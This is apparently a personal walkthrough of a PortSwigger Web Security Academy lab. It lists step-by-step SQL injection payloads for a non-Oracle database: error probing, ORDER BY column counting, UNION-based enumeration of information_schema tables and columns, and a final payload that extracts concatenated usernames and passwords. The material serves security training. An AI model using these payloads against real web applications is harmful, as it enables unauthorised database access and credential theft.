# SQL injection attack, listing the database contents on non-Oracle databases
https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle

Step - 1
--------
'
-
Error
Single Quotes

Step - 2
--------
'--
---
No MySQL

Step - 3
--------
' ORDER BY 3--
--------------
Error
2 Column

Step - 4
--------
' UNION SELECT 'a','a'--
------------------------
2 String Column

Step - 5
--------
' UNION SELECT 'a',table_name FROM information_schema.tables--
--------------------------------------------------------------
Table: users_losije

Step - 6
--------
' UNION SELECT 'a',column_name FROM information_schema.columns WHERE table_name='users_losije'--
------------------------------------------------------------------------------------------------
Column: username_nlazuv and password_xcildc

Step - 7
--------
' UNION SELECT 'a',username_nlazuv || '~' || password_xcildc FROM users_losije--
